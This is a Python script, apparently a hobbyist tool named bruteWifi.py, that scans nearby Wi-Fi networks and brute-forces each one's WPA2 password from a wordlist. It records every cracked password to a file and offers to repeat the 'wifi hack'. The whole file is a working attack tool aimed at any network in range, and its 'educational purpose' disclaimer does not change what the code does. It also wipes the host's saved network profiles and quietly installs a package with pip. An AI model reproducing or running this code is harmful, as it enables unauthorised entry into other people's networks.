import os
import sys
import time
import platform
from scripts.banner import clear, banner
from scripts.sprint import sprint
from scripts.colors import *

try:
    import pywifi
except ModuleNotFoundError:
    os.system("pip install pywifi")
from pywifi import const


def welcome_screen():
    """
    Shows the welcome screen
    """
    check_root()

    sprint(f"\n{red}Note: {cyan}This tool is made by Xpert for educational purpose...")
    sprint(f"\n{green}Preparing Attack...")
    time.sleep(2)
    clear()
    banner()


def show_help():
    """
    Show help and exit
    """
    banner()
    print(
        f"\t{red}-> {cyan}Usage: {yellow}python3 bruteWifi.py [wordlist]\n"
        f"\t{red}-> {cyan}python3 bruteWifi.py {yellow}(it wil use default wordlist)"
    )
    exit()


def check_root():
    """
    Checks for admin privileges
    """
    if os.getuid() == 0:
        pass
    else:
        if "aarch64" in platform.machine():
            sys.exit("Run this tool as root in Termux.")
        elif "Linux" in platform.platform():
            sys.exit("You need to be root.")
        elif "Windows" in platform.platform():
            sys.exit(
                "I am developed to work on Windows. Dont worry I'll take care of next!"
            )


def scan(face):
    face.scan()
    return face.scan_results()


def main():
    wifi = pywifi.PyWiFi()
    inface = wifi.interfaces()[0]
    scanner = scan(inface)

    num = len(scanner)

    print(f"{red}Number of wifi found: {random_color}{str(num)}")
    input(f"{yellow}\nPress enter to start___")

    for i, x in enumerate(scanner):
        res = test(num - i, inface, x, passwords, ts)

        if res:
            print(random_color + "=" * 20)
            print(f"{red}Password found : {cyan}{str(res)}\n")

            with open("avail_wifis.txt", "a") as f:
                f.write(str(res) + "\n")

            print(random_color + "=" * 20)


def test(i, face, x, key, ts):
    wifi_name = x.bssid if len(x.ssid) > len(x.bssid) else x.ssid

    if wifi_name in tried:
        print(
            f"{red}[!] {yellow}Password tried -- {str(wifi_name)}\n{green}Password is known!"
        )
        return False

    print(f"{random_color}Trying to connect to wifi {str(wifi_name)}")

    for n, password in enumerate(key):
        if f"{wifi_name} -- {password}" in found:
            print(f"{red}Password already found +_+")
            continue
        else:
            with open("tried_passwords.txt", "a") as f:
                f.write(str(wifi_name) + "--" + str(password) + "\n")
        tried.append(str(wifi_name) + "--" + str(password))
        print(
            f"{random_color}Trying password {red}{str(password)} "
            f"{cyan}{str(n)} / {green}{str(len(key))}"
        )

        profile = pywifi.Profile()
        profile.ssid = wifi_name
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password
        # Remove all hotspot configurations
        face.remove_all_network_profiles()
        tmp_profile = face.add_network_profile(profile)
        face.connect(tmp_profile)
        code = 10
        t1 = time.time()
        # Cyclic refresh status, if set to 0, the password is wrong,
        # if timeout, proceed to the next
        while code != 0:
            time.sleep(0.1)
            code = face.status()
            now = time.time() - t1
            if now > ts:
                break
            if code == 4:
                face.disconnect()
                return str(wifi_name) + "--" + str(password)
    return False


if __name__ == "__main__":
    if len(sys.argv) == 2:
        if sys.argv[1] == "--help":
            show_help()
        passwd_list = sys.argv[1]
    else:
        passwd_list = "passWords.txt"
    welcome_screen()

    passwords = [
        x.strip("\n")
        for x in open(passwd_list, "r", encoding="UTF-8", errors="ignore").readlines()
    ]
    tried = [
        x.strip("\n").split("--")[0] for x in open("avail_wifis.txt", "a+").readlines()
    ]
    found = [x.strip("\n") for x in open("tried_passwords.txt", "a+").readlines()]
    ts = 15

    running = True

    while running:
        main()
        # perform another wifi hack?
        ch = input(f"{random_color}{'Do you want to continue? (y/n): '}").lower()

        if ch == "no" or ch == "n":
            clear()
            exit(0)
        else:
            clear()
            banner()
